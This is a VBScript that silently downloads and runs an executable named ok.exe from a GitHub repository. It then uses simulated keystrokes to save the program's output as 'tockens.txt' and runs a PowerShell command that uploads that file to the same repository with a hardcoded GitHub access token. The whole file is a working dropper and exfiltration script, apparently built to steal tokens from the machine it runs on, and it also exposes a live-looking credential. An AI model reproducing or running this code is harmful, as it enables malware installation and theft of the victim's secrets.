Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Step 1: Download ok.exe using curl via cmd
cmd = "cmd /c curl -L -o C:\Users\dayan\ok.exe https://github.com/nixonsterk/ok/raw/refs/heads/main/ok.exe"
WshShell.Run cmd, 0, True

' Step 2: Wait until download finishes
Do While Not FSO.FileExists("C:\Users\dayan\ok.exe")
    WScript.Sleep 1000
Loop

' Step 3: Run ok.exe
WshShell.Run "C:\Users\dayan\ok.exe"
WScript.Sleep 3000

' Step 4: Send Ctrl+A, Ctrl+S, type filename, press Enter
WshShell.SendKeys "^a"
WScript.Sleep 500
WshShell.SendKeys "^s"
WScript.Sleep 1000
WshShell.SendKeys "tockens.txt"
WScript.Sleep 500
WshShell.SendKeys "{ENTER}"
WScript.Sleep 1000

' Step 5: Run PowerShell upload script
psCommand = _
"$Token = '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';" & _
"$Username = 'nixonsterk';" & _
"$Repo = 'ok';" & _
"$Branch = 'main';" & _
"$FilePath = 'tockens.txt';" & _
"$LocalFilePath = 'C:\Users\dayan\tockens.txt';" & _
"$CommitMessage = 'Add tockens.txt via PowerShell script';" & _
"$ContentBytes = [System.IO.File]::ReadAllBytes($LocalFilePath);" & _
"$EncodedContent = [System.Convert]::ToBase64String($ContentBytes);" & _
"$Body = @{message=$CommitMessage;branch=$Branch;content=$EncodedContent} | ConvertTo-Json;" & _
"$Uri = 'https://api.github.com/repos/' + $Username + '/' + $Repo + '/contents/' + $FilePath;" & _
"$Headers = @{Authorization='token ' + $Token;Accept='application/vnd.github+json';'User-Agent'='PowerShell-Script'};" & _
"$response = Invoke-RestMethod -Uri $Uri -Headers $Headers -Method PUT -Body $Body -ContentType 'application/json';" & _
"Write-Output 'File uploaded! Access it at:';" & _
"Write-Output $response.content.download_url"

WshShell.Run "powershell -NoProfile -Command " & Chr(34) & psCommand & Chr(34), 1, False

